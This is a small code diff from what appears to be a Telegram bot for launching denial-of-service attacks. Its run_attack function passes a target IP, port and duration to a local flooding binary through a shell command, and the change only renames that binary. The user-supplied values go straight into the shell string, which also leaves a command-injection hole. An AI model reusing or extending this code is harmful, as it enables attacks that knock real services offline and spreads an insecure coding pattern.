@@ -158,7 +158,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./gondareddy {ip} {port} {duration} 1000",
+            f"./9936 {ip} {port} {duration} 1000",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
